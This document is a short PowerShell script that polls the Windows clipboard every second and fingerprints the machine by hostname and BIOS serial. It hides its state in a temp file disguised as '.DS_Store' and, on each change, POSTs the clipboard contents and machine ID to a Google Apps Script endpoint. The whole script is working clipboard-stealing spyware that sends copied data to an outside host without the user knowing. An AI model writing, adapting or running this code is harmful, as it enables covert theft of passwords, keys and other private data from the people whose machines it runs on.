
function grabClip(){
    $clipPath = "$Env:Temp/.DS_Store"
    $ourSerial = ((gwmi win32_bios | fl SerialNumber) | Out-String).Split(":")[1].Substring(1).Trim()
    $id = hostname
    $id += $ourSerial
    $currentClipboard = Get-Clipboard
    $previousClipboard = Get-Content $clipPath -ErrorAction SilentlyContinue
    if($currentClipboard -ne $previousClipboard){
        $currentClipboard > $clipPath
        $json=@{
            clipboard= Get-Clipboard;
            id = $id
        }
        $res = Invoke-RestMethod -Uri https://script.google.com/macros/s/AKfycbz8eC61dfJk_IybX-X2ONNbwWbgzdEAt4303G1uGy0R1yj_svM/exec -Method POST -Body ($json|ConvertTo-Json) -ContentType "application/json" -UseBasicParsing
        Write-Host ($res)
    }
}
while(1){
    grabClip
    sleep 1
}